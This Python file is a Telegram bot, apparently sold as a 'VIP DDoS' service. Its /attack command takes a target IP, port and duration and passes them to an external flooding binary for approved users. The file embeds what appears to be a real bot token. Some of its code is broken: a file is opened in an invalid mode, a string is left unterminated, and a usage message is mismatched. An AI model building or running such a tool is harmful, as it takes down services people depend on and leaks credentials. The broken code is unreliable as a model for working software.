import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7851142107:AAHNG5VRIIg9l8yovDgTEYGsUmym7zT5kiQ'
ADMIN_USER_ID = 5464427719
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'felix') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*😊 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝙁𝙚𝙡𝙞𝙭 𝙑𝙞𝙥 𝘿𝘿𝙊𝙎⛈️*\n\n"
        "*🌷𝙊𝙒𝙉𝙀𝙍 ~ @Felixbbyy ❤‍🩹🫂*
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def felix(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝘼𝙧𝙚𝙚 𝘽𝙝𝙖𝙞 𝙏𝙪 𝙔𝙚 𝙎𝙖𝙗 𝙉𝙝𝙞 𝘿𝙚𝙠𝙝 𝙎𝙖𝙠𝙩𝙖.*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /felix <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./sharp {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*🥺 Attack Completed! ❤‍🩹*\n*𝙏𝙝𝙖𝙣𝙠 𝙔𝙤𝙪 𝙁𝙤𝙧 𝙐𝙨𝙞𝙣𝙜 𝙁𝙚𝙡𝙞𝙭 𝙑𝙄𝙋*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*💔 𝙔𝙤𝙪 𝘼𝙧𝙚 𝙉𝙤𝙩 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 🥺.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /felix <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*⛈️ 𝙑𝙄𝙋 𝙐𝙎𝙀𝙍 𝙊𝙍 @Felixbbyy ✅*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("felix", felix))
    application.add_handler(CommandHandler("attack", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
